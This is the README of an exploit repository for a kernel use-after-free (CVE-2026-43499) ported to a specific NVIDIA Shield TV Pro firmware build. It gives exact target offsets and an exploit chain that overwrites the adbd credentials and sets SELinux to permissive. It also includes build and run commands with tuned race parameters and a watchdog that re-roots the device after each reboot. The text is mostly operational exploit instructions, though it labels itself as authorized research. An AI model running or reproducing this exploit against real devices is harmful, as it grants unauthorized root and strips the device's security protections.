# GhostLock for NVIDIA Shield TV Pro 9.2.4

Validated `arm64` port of the GhostLock futex PI use-after-free
(CVE-2026-43499) for the 2019 NVIDIA Shield TV Pro (`mdarcy`) running Shield
Experience 9.2.4. The payload changes the credentials of the live ADB daemon,
so new ADB shells are UID 0 without a bootloader unlock, userdata wipe, `su`
installation, or verified-partition modification.

> This is a build-specific kernel exploit for authorized security research.
> A mismatch or lost race can panic the kernel. Do not run it on another
> fingerprint, kernel, device, or hardware revision.

## Validated target

| Field | Required value |
| --- | --- |
| Product | NVIDIA Shield TV Pro 2019, `mdarcy` |
| Fingerprint | `NVIDIA/mdarcy/mdarcy:11/RQ1A.210105.003/7825230_4387.0822:user/release-keys` |
| Kernel | `4.9.141-tegra-gb6e5605a` |
| Android patch level | `2026-01-05` |
| Kernel base | `0xffffff8008080000` (offset disabled) |

The port was validated on a locked device with green Verified Boot and
enforcing dm-verity. Those mechanisms remain intact because the exploit
changes only live kernel state.

## Result and lifetime

After a successful run, a fresh connection reports UID/GID 0 for both `adbd`
and its child shell, full capabilities through capability 37, seccomp disabled,
and SELinux permissive. Root survives ADB client disconnects. It does not
survive an `adbd` restart or device reboot.

For practical reboot persistence without modifying verified partitions, the
repository includes an optional, rootless Podman watchdog for an always-on
Linux host. It is locked to the exact fingerprint, kernel, and payload hash and
reapplies the exploit only when a fresh ADB shell is not root. See
[`watchdog/README.md`](watchdog/README.md).

## Exploit chain

1. Trigger the vulnerable futex PI rollback path and retain a stale
   `rt_mutex_waiter` on a kernel stack.
2. Stamp the reclaimed stack with `MCAST_BLOCK_SOURCE` and redirect the
   rt-mutex tree operation.
3. Reclaim a freed order-2 `mm_struct` slab page with a shaped skb payload.
4. Redirect `ashmem_misc.fops` to a fake table backed by legacy configfs
   read/write handlers.
5. Walk the task list, locate the requested `adbd` PID, and verify its complete
   credential object.
6. Perform one bounded write over IDs, securebits, and capability words; make
   SELinux permissive; then restore the ashmem operations and boot-ID pointer.

The inherited pipe-buffer physical read/write stage is not used. Detailed
target observations and verified offsets are in [`PORT_STATUS.md`](PORT_STATUS.md).

## Build

The compiler is Android NDK r29 (`aarch64-linux-android30-clang`). Build
directly with an installed Linux NDK:

```sh
cd exploit
make NDK=/opt/android-ndk-r29
```

Or build the supplied Podman image, which downloads the official r29 Linux
archive and checks its published SHA-1 before extraction:

```sh
podman build -t ghostlock-android:ndk-r29 -f build/Containerfile .
podman run --rm \
  -v "$PWD:/src:Z" \
  -w /src/exploit \
  ghostlock-android:ndk-r29 make -B
```

Output:

```text
exploit/build/preload-mdarcy-9.2.4.so
SHA-256 a3a1e75b627d8dd419e9bafd2a73082a8647510bf6ce4f975e52baf5aa1d0761
```

The Shield build intentionally excludes the reference project's embedded `su`
daemon and wallpaper payload.

## Run

Connect over authorized network ADB, push the release asset or local build,
then enter an ADB shell:

```sh
adb connect SHIELD_ADDRESS:5555
adb -s SHIELD_ADDRESS:5555 push \
  exploit/build/preload-mdarcy-9.2.4.so \
  /data/local/tmp/preload-mdarcy-9.2.4.so
adb -s SHIELD_ADDRESS:5555 shell chmod 0755 \
  /data/local/tmp/preload-mdarcy-9.2.4.so
adb -s SHIELD_ADDRESS:5555 shell
```

Run this inside that device shell:

```sh
GHOSTLOCK_FIXED_BASE=1 \
GHOSTLOCK_MAIN_ROUTE=slide-mcast \
GHOSTLOCK_SLIDE_FULL_LOCK=1 \
GHOSTLOCK_MIXED_ORDER_PAYLOAD=1 \
GHOSTLOCK_MM_PARTIALS=14 \
GHOSTLOCK_BUDDY_HOLD_PAIRS=256 \
GHOSTLOCK_BUDDY_HOLD_SENDS=8192 \
GHOSTLOCK_RECLAIM_PAIRS=64 \
GHOSTLOCK_RECLAIM_SENDS=2048 \
GHOSTLOCK_ADBD_ROOT_CONFIGFS=1 \
GHOSTLOCK_ADBD_PID="$(pidof adbd)" \
LD_PRELOAD=/data/local/tmp/preload-mdarcy-9.2.4.so \
/system/bin/true
```

Disconnect and open a fresh transport for verification:

```sh
adb disconnect SHIELD_ADDRESS:5555
adb connect SHIELD_ADDRESS:5555
adb -s SHIELD_ADDRESS:5555 shell id
adb -s SHIELD_ADDRESS:5555 shell \
  'grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp):" /proc/$(pidof adbd)/status'
```

The payload refuses to retrigger from an already-UID-0 ADB shell unless
`GHOSTLOCK_FORCE_ROOT_TRIGGER=1` is deliberately supplied. Do not force it;
the privileged scheduling path has different PI behavior and can panic.

## Logs and recovery

Diagnostics are synchronously written to
`/sdcard/Download/log_<timestamp>.txt`, falling back to `/data/local/tmp`.
If the race panics the kernel, wait for the normal reboot and pull the latest
log before retrying. The watchdog defaults to a 15-minute global cooldown and
two attempts per boot to avoid a reboot loop.

## Repository map

- `exploit/src/`: trigger, reclaim, arbitrary read/write, and bounded adbd
  credential patch.
- `exploit/targets/shield-mdarcy-9.2.4/`: exact build-specific target layout.
- `analysis/`: kernel symbol and layout extraction helpers.
- `watchdog/`: hash-pinned host-side re-root service.
- `report.md`: original OPPO reference-port analysis retained for provenance.

## Credits and license

This port derives from the GhostLock research and exploit framework published
by NebuSec and the OPPO PCKM00 reference port by yijiacloud. KernelSnitch is
embedded under its upstream terms.

- <https://github.com/NebuSec/CyberMeowfia>
- <https://github.com/yijiacloud/GhostLock-OPPO-PCKM00>
- <https://github.com/torvalds/linux/commit/3bfdc63936dd4773109b7b8c280c0f3b5ae7d349>

Apache-2.0; see [`LICENSE`](LICENSE).
